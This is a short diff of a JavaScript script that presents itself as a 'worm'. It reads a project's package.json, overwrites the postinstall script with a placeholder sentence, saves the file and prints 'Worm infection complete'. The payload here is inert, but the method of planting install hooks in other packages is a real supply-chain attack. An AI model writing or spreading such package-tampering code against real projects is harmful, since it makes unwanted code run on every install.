@@ -17,6 +17,8 @@ try{
     console.log(projectPath);
 
     var packageJsonPath = path.join(projectPath, 'package.json');
+    
+    console.log(packageJsonPath);
 
     var packageJsonContent = JSON.parse(
         fs.readFileSync( packageJsonPath ).toString()
@@ -24,7 +26,6 @@ try{
 
     packageJsonContent.scripts = packageJsonContent.scripts || {};
     packageJsonContent.scripts.postinstall = "this sentence is the result of the worm infection";
-
 
     fs.writeFileSync( packageJsonPath, JSON.stringify(packageJsonContent, null, 3) )
     console.log('Worm infection complete, congratulations!');
